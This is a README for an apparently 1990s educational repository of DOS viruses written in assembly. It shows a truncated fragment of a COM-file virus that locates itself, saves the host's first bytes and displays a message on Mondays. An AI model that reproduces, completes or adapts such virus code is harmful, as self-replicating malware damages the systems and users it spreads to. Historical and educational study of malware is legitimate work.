Computer Viruses
================

Last update: 1996 - 1997

This project contains education / informative materials about DOS viruses.

- The [/src](/src) folder contains a few DOS bases viruses created in assembly language
- The [/doc](/doc) folder contains information about DOS viruses and antiviruses

```assembly
lungime equ ((offset sfirsit)-(offset entry))
.model tiny
.code
org 100h
entry: call entr                                ; find in BP the address of the virus
entr   proc near
       pop bp
       sub bp,3
       mov byte ptr [cale+2-entry+bp],'C'

       mov cx,5                                 ; save the first 5 bytes
       mov si,offset header-entry               ; in memory
       add si,bp
       mov di,offset horig-entry
       add di,bp
       rep movsb

          mov ah,2ah
          int 21h
          cmp al,1                               ; display the message if monday
          jnz urmat
          mov ah,9
          mov dx,offset mesaj-entry
          add dx,bp
          int 21h

	...
```

![Analytics](https://ga-beacon.appspot.com/UA-2402433-6/beacon.en.html)
